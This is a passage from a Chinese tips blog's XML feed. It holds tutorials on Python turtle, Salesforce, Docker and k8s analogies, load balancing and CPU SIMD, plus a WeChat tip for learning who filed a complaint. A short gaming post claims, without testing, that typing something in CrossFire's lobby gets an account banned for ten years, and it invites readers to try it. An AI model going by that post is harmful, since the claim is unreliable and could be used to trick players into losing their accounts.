class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">draw_cricle(x=-<span class="number">250</span>,y=-<span class="number">30</span>,color=<span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line">draw_cricle(x=<span class="number">0</span>,y=-<span class="number">30</span>,color=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line">draw_cricle(x=<span class="number">250</span>,y=-<span class="number">30</span>,color=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">draw_cricle(x=-<span class="number">125</span>,y=-<span class="number">105</span>,color=<span class="string">&#x27;yellow&#x27;</span>)</span><br><span class="line">draw_cricle(x=<span class="number">125</span>,y=-<span class="number">105</span>,color=<span class="string">&#x27;green&#x27;</span>)</span><br></pre></td></tr></table></figure><p>看了上面操作过程，操作还是挺简单的，用来做一个turtle学习素材还是很nice的。</p><p>上面的过程完成后，绘图的部分就算是完成了，最后再来完善一下逻辑。因为绘图完成后会自动关闭绘图窗口，绘图完成后还没看清楚就已经关闭了。于是，设置一下绘制窗口的属性就OK了。</p><p>绘图完成后保持窗口不被关闭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">screen = tle.Screen()</span><br><span class="line">screen.exitonclick()</span><br></pre></td></tr></table></figure><p>今天的表演到此结束，欢迎大家一起交流进步，干货不断、分享不断！</p><p><img src="http://static.luozhinet.com/fe/6059369156d501990e450b50df7a85" alt="file"></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> color </tag>
            
            <tag> 圆圈 </tag>
            
            <tag> 绘制 </tag>
            
            <tag> turtle </tag>
            
            <tag> 绘图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>salesforce是什么</title>
      <link href="/posts/223a84d24c3b/"/>
      <url>/posts/223a84d24c3b/</url>
      
        <content type="html"><![CDATA[<h2 id="1-salesforce是什么？"><a href="#1-salesforce是什么？" class="headerlink" title="1.salesforce是什么？"></a>1.salesforce是什么？</h2><p>salesforce致力于在销售，服务，营销，分析和 客户联系方面为用户提供帮助。</p><p>通过使用标准产品和功能（standard products and features），可以管理潜在客户（prospects ）和客户（customers）的关系，与员工和合作伙伴协作和交流互动，并将你的数据安全地存储在云端。</p><p>然而，标准产品和功能仅仅是开端。salesforce平台能够为客户（customers）、合作伙伴（partners）和员工（employees）提供定制化（customize ）和个性化（personalize ）体验，并轻松扩展立即可用的功能。</p><p>那么，CRM 有何种重要性呢？让我们从 CRM 的定义着手。</p><h2 id="2-什么是CRM"><a href="#2-什么是CRM" class="headerlink" title="2.什么是CRM"></a>2.什么是CRM</h2><p>CRM：客户关系管理（ Customer Relationship Management）</p><p>这项技术允许你管理客户和潜在客户的关系，并跟踪与你的所有互动相关的数据。同时，它还可以帮助团队在内部和外部进行合作，收集来自社交媒体的见解，跟踪重要指标，并通过电子邮件、电话、社交和其他渠道进行沟通。</p><p>在 Salesforce 中，所有这些信息都安全地存储在云端。</p><h2 id="3-Salesforce-如何管理数据"><a href="#3-Salesforce-如何管理数据" class="headerlink" title="3.Salesforce 如何管理数据"></a>3.Salesforce 如何管理数据</h2><p>Salesforce 将数据整理成对象（objects ）和记录（records）。你可以把对象想象成电子表格上的一个sheet，把记录想象成一行数据。</p><p>可以从导航栏访问对象。</p><p>以下是salesforce中的一些术语</p><table style="height: 239px; width: 845px" border="0"><tbody><tr><td align="left" valign="middle">record-行记录</td><td>相当于一条数据</td></tr><tr><td>Field-字段</td><td>存储值的位置，如姓名或地址；以电子表格为例，字段指电子表格上的一列</td></tr><tr><td>Object-对象</td><td>数据库中的一个表；在电子表格示例中，对象指电子表格上的sheet</td></tr><tr><td>Org-组织</td><td>Org 是“组织”的缩写，意指你所有数据、配置和自定义信息的所在地。你和用户登录后即可访问。</td></tr><tr><td>App-应用程序</td><td>支持业务流程的一组字段、对象、权限和功能</td></tr></tbody></table><h2 id="4-salesforce标准对象和自定义对象"><a href="#4-salesforce标准对象和自定义对象" class="headerlink" title="4.salesforce标准对象和自定义对象"></a>4.salesforce标准对象和自定义对象</h2><p>以下介绍常用以及核心标准对象</p><table style="height: 172px; width: 954px" border="0"><tbody><tr><td>Account-客户</td><td>客户是指与公司有业务往来的公司，也可以通过个人客户与个人做生意（比如独立承包商）</td></tr><tr><td>Contact-联系人</td><td>联系人是在客户处工作的员工</td></tr><tr><td>Lead-潜在客户</td><td><p>潜在客户是指潜在买方。尚未确认他们是否准备好购买产品或需要什么产品。</p><p>正常情况下，无需使用潜在客户，但是如果您有团队销售，或者如果您拥有针对潜在客户和合格买家的不同销售流程，那么其可能会有所帮助</p></td></tr><tr><td>Opportunity-业务机会</td><td>业务机会意指已经成功转换的合格潜在客户。在转换潜在客户时，将创建一个和Opportunity关联的Account、Contact</td></tr></tbody></table><p><img src="http://static.luozhinet.com/cb/8422f01a5e1ce71087f1bf424b7a01"></p><h2 id="5-Lightning-Experience-简介"><a href="#5-Lightning-Experience-简介" class="headerlink" title="5.Lightning Experience 简介"></a>5.Lightning Experience 简介</h2><p>Lightning Experience 可提供现代化、高效的用户体验，旨在帮助您的销售团队达成更多交易，更快、更智能地完成销售流程。</p><p>手机的发展正在影响人们的工作方式。销售代表正在使用手机研究潜在客户，获取客户会议的方向，与客户建立社交联系，等等。salesforce也把握了这一趋势。这就是为什么使用 Salesforce 时，可以从台式机（使用 Lightning Experience）和移动设备（使用 Salesforce 应用程序）中获得有用的内容。</p><p>Lightning Experience 是指针对销售用途得到优化的 Salesforce 中的页面。该新功能可以帮助您的销售代表在每次登录 Salesforce 时专注于正确的交易和操作。该交互式工具具有灵活性，销售代表可以使用这些工具动态地可视化数据并处理交易。</p><p><img src="http://static.luozhinet.com/f2/0f2b9d7678260727dd8e49b7cd1fee"></p><p>以下官方解释：</p><p>为何将其命名为 “Lightning” 呢？让我们联想一下现实暴风雨中的闪电。它速度惊人，转瞬即逝。它魅力无限，令人叹为观止。它独一无二，不可复刻。</p><p>这很像 Salesforce 的 Lightning Experience。Lightning Experience 体验流畅、界面精美，且对每个销售代表而言均为独一无二。该页面易于使用，旨在帮助销售代表更快地完成销售计划；配备个性化提醒和交互式助手，可帮助销售代表专注于处理重要事项。</p><p>我们构建 Lightning Experience 的终极目标是为您和客户提供便利。Lightning Experience 基于对您过去几年里信息和发布内容的收集。Lightning Experience 是适用于销售代表的杀手级销售应用程序。</p><h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ul><li><a href="https://help.salesforce.com/apex/HTViewHelpDoc?id=lex_considerations_intro.htm&language=en_US">Lightning Experience Considerations</a></li><li><a href="https://help.salesforce.com/apex/HTViewHelpDoc?id=glossary.htm&language=en_US">Glossary</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 应用 </tag>
            
            <tag> 营销 </tag>
            
            <tag> 客户 </tag>
            
            <tag> 无限 </tag>
            
            <tag> salesforce </tag>
            
            <tag> lightning </tag>
            
            <tag> experience </tag>
            
            <tag> 潜在 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【大话云原生】煮饺子与docker、kubernetes之间的关系</title>
      <link href="/posts/e621091efb56/"/>
      <url>/posts/e621091efb56/</url>
      
        <content type="html"><![CDATA[<blockquote><p>云原生的概念最近非常火爆，企业落地云原生的愿望也越发强烈。看过很多关于云原生的文章，要么云山雾罩，要么曲高和寡。 所以笔者就有了写《大话云原生》系列文章的想法，期望用最通俗、简单的语言说明白云原生生态系统内的组成及应用关系。那么，开始吧，这是第一篇！</p></blockquote><p><strong>这真的是一篇讲架构技术的文章，不是小说！建议您看下去！</strong></p><h2 id="一、周末煮饺子聊到容器问题"><a href="#一、周末煮饺子聊到容器问题" class="headerlink" title="一、周末煮饺子聊到容器问题"></a>一、周末煮饺子聊到容器问题</h2><p>周末和老婆一起包了顿饺子，“老公，我去买瓶醋，你把饺子先煮一下吧”。我笨手笨脚准备半天，还没煮完，老婆就回来了。我看着这一锅饺子问道：“老婆，你说这 <strong>饭店是怎么煮饺子的啊？</strong> 每个人口味不一样，饭量也都不一样啊，想想都头疼！”</p><p><img src="http://static.luozhinet.com/f4/f3eb5599cdbef4c50731615813e828" alt="file"></p><p>小娜同学一边用手比划一边说：“饭店当然不能像家里这么煮饺子啊，他们有一种特制的锅，就是那个、那个样子的”。<br>我感觉自己娶了一个傻女人，“到底是哪个样子的？用手能比划出来啊？你是不是爱情公寓看多了？”。老婆听到我的抱怨，拿起手机搜索了一下：“诺，就是这个样子的，你个白痴！”</p><p><img src="http://static.luozhinet.com/4f/23b47b63e98fdb4e1c1295b1f5e0d3" alt="file"></p><p>“饭店就是用这种锅煮饺子的，<strong>水是一锅水，炉是一个炉，分成多个容器，每个容器里面放入一个客人点的饺子</strong>就可以啦。”作为生活小能手的小娜同学知道的可真多。<br>“哎我去，这不就是<strong>一个服务器启动了多个docker容器</strong>么？”同样作为程序员的小娜赞到：“老公，你说的还真对哈，我最近可是刚看了docker呢，但我还不太会用！”。</p><h2 id="二、说说docker与煮饺子的容器"><a href="#二、说说docker与煮饺子的容器" class="headerlink" title="二、说说docker与煮饺子的容器"></a>二、说说docker与煮饺子的容器</h2><p>“你一个前端学什么docker”。小娜不服气了，”哎，你别瞧不起人，我还知道k8s呢”。这可让我有点意外，正当我意外之时，老婆一句话差点让我喷出来：”那k8s到底是个什么东西啊？”，<strong>我们商量好饭后她刷碗</strong>，我给她说说docker与k8。</p><p><strong>不一会就开始了饭后辅导：</strong> 饭店煮饺子本身就是一种服务（应用服务），煮饺子的锅就像一个服务器，锅里的每一个网状笼就像一个docker容器，通常情况下一个网状笼只煮一种饺子，就像一个docker容器通常只提供一个服务（微服务）。同一个服务器上的docker容器之间能够进行必要的隔离，避免资源冲突（不同馅的饺子煮混）。又能充分的共享服务器资源（那一锅水和供电），达到资源的合理利用，避免浪费。</p><p>小娜微笑点点头表示明白了，”那饭店规模变大，客人越来越多，就得买更多的大锅（服务器）啊？”</p><p><img src="http://static.luozhinet.com/c0/734d9e2634a3c017659443ab989fdf" alt="file"></p><p>那是当然喽，你看哈，<strong>当服务器越来越多的时候就组成了集群</strong>。<strong>docker容器还有一个好处就是它的标准化，标准化在这里就代表了部署灵活性</strong>。假如一号锅突然断电了，煮饺子的师傅就可以把煮饺子的容器拔出来插入二号锅，因为容器的标准是一样的。就像docker容器可以灵活快速的启动，在不同的服务器上启动提供服务。</p><p>小娜同学再次的点了点头，向我投来仰慕的眼光。趁热打铁，我总结道：<strong>”docker容器有效的实现了服务的环境封装的标准化，以及同服务器容器之间的环境隔离，资源共享</strong>“。</p><h2 id="三、聊聊集群煮饺子（k8s）"><a href="#三、聊聊集群煮饺子（k8s）" class="headerlink" title="三、聊聊集群煮饺子（k8s）"></a>三、聊聊集群煮饺子（k8s）</h2><p>小娜同学对于接下来的内容已经迫不及待了，”docker我懂了，快说说k8s”。我故弄玄虚的说到，你看哈，现在这个<strong>饭店的集群容器煮饺子的模式</strong>还需要解决哪些问题？我们俩讨论了一下，总结了下面这几条：</p><ul><li>饭店的客流量不总是满的，大锅的个数肯定是按照最大需求买的，但是肯定有部分的时间大锅是闲置的。</li><li>客流量肯定是有一定的规律的吧？比如周末比工作日客流量大，下班后比上班时间客流量大。</li><li>假如突然来了一个旅游团进来用餐，谁来做应急管理？快速的给大锅插电？烧水？满足用餐需求？</li><li>如果为了避免煮出来的饺子味道混淆，是不是素馅类不同容器的放到一个大锅里面煮？肉馅的放在一起煮、海鲜馅的放在一起煮会好一些？</li><li>是不是得有人定期的对“大锅”和大锅里面的容器进行卫生检查、运行状态(健康检查)？</li><li>是不是得有一个人清楚的知道，素馅的一两饺子是唐僧的，肉馅的四两饺子是猪八戒的？</li></ul><p>其实还有很多需要注意的问题，所有的这些都可以归纳为：任务分配或者是服务编排，或者是容器的编排问题。k8s的主要作用就是用来解决类似这样的一些问题：</p><ul><li>根据访问量大小快速的对容器数量进行扩容、缩容。</li><li>遵循一定的预定计划来执行容器编排工作、应急管理工作、健康检查工作</li><li>合理的编排容器，有些容器放在CPU密集型的服务器上，有些容器放在内存密集型容器上。毕竟有的容器运行的是计算型微服务，有的容器运行的是耗内存的微服务。合理的编排能够达到资源的最大利用率。</li></ul><p>以上等等这些进行<strong>容器管理、编排的问题，都需要k8s来管理支撑，而且是自动化支撑</strong>。 说到这里，小娜同学若有所思，“我听是听明白了，但是感觉这东西好庞大、好复杂啊。开发一个应用放在一起部署不好么？为什么搞这么复杂？”</p><p>还别说，小娜同学还真问道点子上了。但这也不能一次全都讲完啊，否则明天的碗谁来刷？</p><h2 id="欢迎关注我的博客，更多精品知识合集"><a href="#欢迎关注我的博客，更多精品知识合集" class="headerlink" title="欢迎关注我的博客，更多精品知识合集"></a>欢迎关注我的博客，更多精品知识合集</h2>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应用 </tag>
            
            <tag> 服务 </tag>
            
            <tag> 架构 </tag>
            
            <tag> 服务器 </tag>
            
            <tag> 容器 </tag>
            
            <tag> docker </tag>
            
            <tag> 饺子 </tag>
            
            <tag> 小娜 </tag>
            
            <tag> k8s </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【大话云原生】负载均衡篇-小饭馆客流量变大了</title>
      <link href="/posts/357fa4a40d8b/"/>
      <url>/posts/357fa4a40d8b/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>这是《大话云原生》系列的第二篇，第一篇《煮饺子与docker、kubernetes之间的关系》推出之后受到大家的欢迎，很多朋友联系到我给我加油打气，感谢！我会继续写下去！<br>书接上回介绍了《煮饺子与docker、kubernetes之间的关系》之后，小娜同学（我老婆）问：为什么不把服务统一开发成一个应用？搞什么分布式？这样感觉很庞大，很复杂啊？为什么要这么搞？所以大话云原生第二篇-负载均衡篇，现在开始！</p><h2 id="二、从路边摊说起"><a href="#二、从路边摊说起" class="headerlink" title="二、从路边摊说起"></a>二、从路边摊说起</h2><p>周五晚上加了班，下班的时候已经很晚了，打电话给小娜打算去吃烧烤，就去我们经常去的那家“夫妻摊位”烧烤。到了之后才发现“夫妻摊位”升级了，现在变成了“夫妻饭馆”。由于已经比较晚了，店里人并不多，就和老板娘聊了起来。聊聊小饭馆的昨天、今天和明天！</p><p>老板娘介绍到：“以前路边摊的时候我俩刚结婚，手里资金有限，就想着开一个路边烧烤摊。我老公负责烤串做菜，我呢、负责服务收银及上菜。挣点小钱！”。老板娘谦虚，等我年纪大了没准也搞个烤串的营生，谁让我爱吃呢！老板娘说之所以能走到今天，主要是因为以下几点：</p><ul><li>她的摊位很少会出现长时间的等菜的现象。因为摊位的桌椅板凳的容量通常是有限的，通常也没那么多客人，食品总的需求量的上限也基本是固定的，相对好协调。</li><li>沟通顺畅、快速，这头点菜点串吼一嗓子、那边就开始做上了。做好了再吼一嗓子，就上菜了。</li><li>短小精悍、容易掉头。夫妻俩之所以选择从路边摊开始，是因为船小好掉头。有可能干一阵发现这个位置客流少，就可以立刻停止经营或者换个地方经营。</li></ul><p>哎，别说，夫妻俩这个阶段就有点像一些软件服务创业公司，刚开始创业的时候，一般做的应用服务都是单体应用。笔者也见过一些小型创业公司上来就想搞微服务云原生，我觉得这不太现实。企业的架构都是一步一步衍进的，不要总想着一口吃一个胖子。如果京东淘宝从第一天做应用服务的时候就想做成今天的样子，他们一定活不到今天。就像一个没开过饭店的人第一次创业就要开五星级饭店，等待他的十有八九就是失败！</p><p><img src="http://static.luozhinet.com/99/9983cd4179ea818391080d3f932035" alt="file"></p><p>这里我所说的单体应用的特点，其实和路边摊的特点是差不多的：</p><ul><li>能够接纳的请求数量时有限的，一是从需求上没那么多用户，二是创业公司资源限制，服务器的内存、CPU配置是有限的。</li><li>单体应用的视图层、控制层、持久层全都在一个应用里面，调用方便、响应快速。服务间没有远程调用RPC，响应速度更快一些，具体到某个服务请求的响应结果更快。</li><li>开发简单、上手快、三五个人团队好管好用。老板决定不干了，随时可以掉头，基本不太肉疼。</li></ul><p>还是要祝贺老板娘啊，生财有道，还会总结经验！</p><h2 id="三、开饭馆与负载均衡"><a href="#三、开饭馆与负载均衡" class="headerlink" title="三、开饭馆与负载均衡"></a>三、开饭馆与负载均衡</h2><p>前一段时间就已经有人愿意为了吃他们夫妻做的烧烤排队了，这夫妻俩一想，我们这俩人也干不过来啊，怎么办？招人吧、扩大规模吧。</p><ul><li>招什么人？当然是厨师啊、端菜收银的妻子自己还能干得过来，主要是丈夫的活挺不住了，对，那就招厨师。</li><li>不能让多出来的客人站着吃吧？租一个附近的门市、添置更多的桌椅板凳。</li></ul><p>同样的道理，软件应用中的单体应用服务扛不住用户需求了怎么办，加服务器啊，多部署几个服务啊，负载均衡啊。</p><p><strong>说说客户端负载均衡与服务端负载均衡</strong></p><ul><li>小夫妻两一口气为饭馆配置了三个厨师（含丈夫），这下可够用了。妻子将<strong>单号订单</strong>给张厨师、<strong>双号订单</strong>给李厨师，两人都干不过来了，再将订单给丈夫。反正外人不用白不用，自己家人能歇会就歇会。她说给谁就给谁，她有自己的一套算法。<strong>这种模式就是“客户端负载均衡”</strong>，妻子作为客户端调用“厨师”服务，会记得总共有几个厨师，然后按照自己的算法将用户请求转发给其中一个厨师。我们常见的Spring Cloud每个服务请求其他微服务的时候，都在其内部维护一个微服务列表，然后根据请求目标及算法从微服务中选择一个服务进行远程服务调用。</li><li>有一天这俩厨师提出意见：这么干太累了没有闲着时候，要么丈夫多出力，要么涨工资。夫妻俩一合计现在实力也不是很雄厚，还是丈夫多出力吧。那妻子也就没有必要记住“订单的单双号”了，就使用一款app输入顾客订单，该app可以实现订单的均衡分配给厨师。<strong>“这种模式就是“服务端负载均衡””</strong>。对于软件架构而言该app就是负载均衡器，常用的软件负载均衡器有nginx、haproxy等。还有一些硬件的负载均衡器，性能上要更好一些，当然收费也更“好”。架构如下图所示：</li></ul><p><img src="http://static.luozhinet.com/66/fa3284ba8ef4a8869bbccc4d92422b" alt="file"></p><p><strong>利与弊：</strong></p><ul><li>“利”就是应用的处理能力增加了，能够处理更多的订单。</li><li>“弊”就是沟通成本增加了，原来吼一嗓子解决的问题，现在需要靠app转发了（负载均衡器）。无论是远程服务调用，还是请求转发转发都是耗时的。</li></ul><p>也就是说：饭店(应用服务)现在处理请求吞吐量上的能力增强了，但是在单个请求的处理速度上实际上是下降了。实际上这就是服务拆分的结果，服务拆分就是在 <strong>“用时间换空间”</strong> 。各位细品！</p><h2 id="四、饭后沟通"><a href="#四、饭后沟通" class="headerlink" title="四、饭后沟通"></a>四、饭后沟通</h2><p>吃完烤串之后，我将上面的一套理论将给了小娜，她很感兴趣：“软件架构真是脱离不开实际生活啊，到处都是活生生的例子”。我趁势吹起了牛逼：“这才哪到哪，下回带你去个大饭店见见世面，有微服务的大饭店！”。</p><h2 id="欢迎关注我的博客，更多精品知识合集"><a href="#欢迎关注我的博客，更多精品知识合集" class="headerlink" title="欢迎关注我的博客，更多精品知识合集"></a>欢迎关注我的博客，更多精品知识合集</h2>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应用 </tag>
            
            <tag> 服务 </tag>
            
            <tag> 架构 </tag>
            
            <tag> 服务器 </tag>
            
            <tag> 负载 </tag>
            
            <tag> 淘宝 </tag>
            
            <tag> 厨师 </tag>
            
            <tag> 均衡 </tag>
            
            <tag> 夫妻 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个故事看懂CPU的SIMD技术</title>
      <link href="/posts/672f9be0c8ea/"/>
      <url>/posts/672f9be0c8ea/</url>
      
        <content type="html"><![CDATA[<p>好久不见，我叫阿Q，是CPU一号车间的员工。我所在的CPU有8个车间，也就是8个核心，咱们每个核心都可以同时执行两个线程，就是8核16线程，那速度杠杠滴。</p><p>我所在的一号车间，除了负责执行指令的我，还有负责读取指令的小A，负责指令译码的小胖和负责结果回写的老K，我们几个各司其职，一起完成执行程序的工作。</p><h2 id="一个简单的循环"><a href="#一个简单的循环" class="headerlink" title="一个简单的循环"></a>一个简单的循环</h2><p>那天，我们遇到了一段代码：</p><p>void array_add(int data[], int len) {<br>  for (int i &#x3D; 0; i &lt; len; i++) {<br>    data[i] +&#x3D; 1;<br>  }<br>}</p><p>循环了好几百次之后，才把这段代码执行完成，每次循环都是做简单又重复的工作，把我累得够呛。</p><p>一旁负责结果回写的老K也是累的满头大汗，吐槽道：“每次都是取出来加1又写回去，要是能一次多取几个数，批量处理就好了”</p><p>老K的话让我眼前一亮，对啊，能不能批量操作呢？</p><p>心里一边想着，一边继续干活了。</p><p>繁忙的一天很快结束了，转眼又到了晚上，计算机关机后，我把大家召集了起来。</p><p>“兄弟们，还记得咱们白天遇到的那个循环吗？”</p><p>“你说哪个循环，咱们这一天可执行了不少循环呢”，小A说到。</p><p>“就是那个把整数数组每个元素都加1的那个循环”</p><p>“我想起来了，那循环怎么了？有什么问题吗？”</p><p>我看了老K一眼，说道：“我在想今天老K的话，像这种循环，每次都是取出来加1又写回去，一次操作一个数，效率太低了，咱们要是升级改造一下，支持一次取出多个数，批量加1，这样岂不是快很多？”</p><p><img src="http://static.luozhinet.com/56/950bc6f4f371674b630dc2cc245dc1"></p><p>老K一听来了兴趣，“这敢情好，你打算怎么做？”</p><p>“这我还没想好，大家有什么建议吗？”</p><p>一旁负责指令译码的小胖说道：“可以新增一条指令，专门用来一次取出多个数据来加1”</p><p>“不行不行，不能限的这么死，今天是加1，万一下次是加2呢？指令里面不能限制为1”</p><p>“那如果每个数据要加的是不一样的怎么办？”</p><p>“你这么一说，那万一不是加法，是减法，乘法怎么办？”</p><p>“还有啊，···”</p><p>大家开始七嘴八舌讨论了起来，没想到一个小小的加法循环，一下子引出了这么多问题来，这是我们没想到的。</p><h2 id="并行计算"><a href="#并行计算" class="headerlink" title="并行计算"></a>并行计算</h2><p>随着讨论的深入，我觉得已经超出了咱们一号车间能把控的范围，需要上报给领导，组织八个车间代表一起来商讨。</p><p>领导一听说有提高性能的新技术，马上来了兴趣，很快便开会组织大家一起来商讨方案。</p><p><img src="http://static.luozhinet.com/83/14ac76744251876a2c62d7cab5d9e5"></p><p>“都到齐了是吧，阿Q你给大家说一下这个会议的目的”，领导说到。</p><p>我站了起来，开始把我们遇到的问题和想法跟大家讲了一遍。</p><p>“是这样的，我们一号车间那天遇到了一段循环代码，循环体的内容很简单，就是给数组中的每一个元素加1。我们执行的时候，就是不断取出每一个元素，然后将其执行加法计算后，再写回去。这样一个一个来加1，我们感觉太慢了， 要是可以一次多取几个，并行加1，那一定比一个一个加快上不少。”</p><p>我刚说完，大家都开始小声议论起来。</p><p>“我看出来了，这其实就是并行计算！”，二号车间小虎一语道出了关键。</p><p>六号车间小六问道：”阿Q，你们已经有方案了吗？“</p><p>“还没有，这正是今天开会的目的，因为情况有点复杂，还需要大家一起来出出主意”</p><p>“好像并不复杂嘛”</p><p>“我上面举的例子只是一个简单的情况，并行计算还可能不是固定的数，可能是一个数组和另一个数组相加。还有可能不是整数相加，而是浮点数，甚至，还可能不是加法，而是减法或者乘法，再或者不是算术运算，而是逻辑运算”</p><p>我刚一说完，大家又开始窃窃私语交流起来。</p><p>“我琢磨着你说的这一系列东西，咱们是要新增一套专门用来并行计算的指令集啊”，小虎说道。</p><p>“这可是大工程啊”</p><p>“是啊···”</p><p>这时，小六又问道：“咱们的计算的时候，都是把数据读取到寄存器进行的，可这寄存器一次只能装一个数，怎么一次读取多个数据呢？”</p><p>“可能需要新增一些容量大一些的寄存器，比如128bit长度，可以同时容纳4个32位的整数”</p><p><img src="http://static.luozhinet.com/0c/7c63eba2ff249239d78609265cf3f6"></p><p>“有这个必要吗？咱们是通用CPU，又不是专门做数学计算的芯片，搞这些东西干嘛？”，四号车间代表提出了质疑。</p><p>我也不甘示弱：“那可太有必要了，在图像、视频、音频处理等领域，有大量这样的计算需求，咱们得提升处理这些数据的能力”</p><p>见我们争执不下，领导拍了拍桌子，会场一下安静了下来。</p><p>“我觉得阿Q说的有道理，咱们确实需要提升处理这类数据运算的能力了。不过不用一下搞那么复杂，先支持整数并行运算就行了。新增寄存器这个也不用着急，可以先借用一下浮点数运算单元FPU的寄存器。这件事先这么定下来，具体的方案你们再继续讨论。”，说完便离开了会议室。</p><p>领导不愧是领导，几句话就把我们安排的明明白白。</p><h2 id="SIMD"><a href="#SIMD" class="headerlink" title="SIMD"></a>SIMD</h2><p>又经过一阵紧张的讨论，我们终于敲定了方案。</p><p>我们借用浮点数运算单元的寄存器，还给它们起了新的名字：MM0-MM7。因为是64位的寄存器，所以可以同时存储两个32位的整数或者4个16位整数或者8个8位的整数。</p><p>我们还新增了一套叫<strong>MMX</strong>的指令集，用来并行执行整数的运算。</p><p><img src="http://static.luozhinet.com/7d/99c70bbfd0123e927babe4aceb4419"></p><p>我们把这种在一条指令中同时处理多个数据的技术叫做单指令多数据流（<code>Single Instruction Multiple Data</code>），简称<strong>SIMD</strong>。</p><p>有了这套指令集，咱们处理这类整数运算问题的速度快了不少。</p><p>不过渐渐地发现了两个很麻烦的问题：</p><p>第一个问题，因为是借用FPU的寄存器，所以当执行SIMD指令的时候，就不能用FPU计算单元，反过来也一样，同时使用的话就会出乱子，所以要经常在不同的模式之间切换，实在是有些麻烦。</p><p>另一个更重要的问题，咱们这套指令集只能处理整数的并行运算，可现在浮点数的并行运算越来越多，尤其是图像、视频还有深度学习的一些数据处理，浮点数情况越来越多，这时候都派不上用场。</p><p>我们把这些问题给领导做了汇报，看到我们已经做出的成绩，领导终于同意继续升级。</p><p>这一次，我们扩展了一套新的SSE指令集出来，新增了XMM0-XMM7总共8个128位的寄存器，再也不用跟FPU共享寄存器了。而且位宽加了一倍，能容纳的数据更多了，能同时处理的数据自然也变多了。</p><p>后来，我们又不断的修改升级，不仅支持了对浮点数并行处理，还推出了新一代的AVX指令集，把寄存器再一次扩大为256位，现在我们的SIMD技术更加先进，处理数据运算的能力越来越强了！</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 指令 </tag>
            
            <tag> 修改 </tag>
            
            <tag> 运算 </tag>
            
            <tag> 整数 </tag>
            
            <tag> 寄存器 </tag>
            
            <tag> 并行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>查询微信被谁投诉方法技巧分享</title>
      <link href="/posts/2b8fe7b29e8c/"/>
      <url>/posts/2b8fe7b29e8c/</url>
      
        <content type="html"><![CDATA[<p>查询微信被谁投诉方法技巧分享</p><p><img src="http://static.luozhinet.com/a7/2f168b2c0f8aeddaa82fc53bb8e1c8" alt="查询微信被谁投诉方法技巧分享" title="查询微信被谁投诉方法技巧分享"></p><p>想必有很多朋友碰到过微信无缘无故被人投诉了，<br>这种情况对生活和工作还是有影响的下面给大家分享<br>如何去查询自己微信是被谁给投诉的方法，微信被封的朋友可以去试试<br><strong>步骤如下：</strong><br>1、微信公众号【微信团队】–菜单栏意见反馈–点推送的“此处”–<br>下拉到底其他选项–下拉“其他异常反馈”进入<br>2、在意见栏输入“我的账号无缘无故被人恶意投诉，严重影响正常工作和沟通。<br>请求严查此人为何投诉我“诸如此类的话语，然后点击提交即可<br>3、大概一天左右的时间，腾讯客服就会给出反馈，<br>之后在推送的回馈处点击进去查看结果，会弹出”处理详情“的页面<br>4、可以看到投诉你的人微信号的前两位和后两位，还有投诉你的原因和时间，<br>我们可以根据这个在好友列表中去找到这个人</p>]]></content>
      
      
      <categories>
          
          <category> 技巧分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技巧 </tag>
            
            <tag> 查询 </tag>
            
            <tag> 微信 </tag>
            
            <tag> 投诉 </tag>
            
            <tag> 下拉 </tag>
            
            <tag> 反馈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>穿越火线持续多年“封号10年”方法</title>
      <link href="/posts/155878850b5d/"/>
      <url>/posts/155878850b5d/</url>
      
        <content type="html"><![CDATA[<p>穿越火线持续多年“封号10年”方法<img src="http://static.luozhinet.com/40/703b88801b66965c9b0bb68667e7a5" alt="穿越火线持续多年“封号10年”方法" title="穿越火线持续多年“封号10年”方法"></p><p>穿越火线持续多年“封号10年”方法此方法已经存在多年了，<br>几乎只要做登录的号必封10年游戏大厅输入：<img src="http://static.luozhinet.com/9e/c46db2f1efe169ba5708ce58dd1558" alt="穿越火线持续多年“封号10年”方法" title="穿越火线持续多年“封号10年”方法"></p><p>ps:小编没有亲测过，大家闲着蛋疼可以试试，哈哈哈~</p>]]></content>
      
      
      <categories>
          
          <category> 技巧分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 方法 </tag>
            
            <tag> 火线 </tag>
            
            <tag> 穿越 </tag>
            
            <tag> 10年 </tag>
            
            <tag> 封号 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑色沙漠手游台服和国服有什么差别，玩哪个好</title>
      <link href="/posts/213ddfd4d87d/"/>
      <url>/posts/213ddfd4d87d/</url>
      
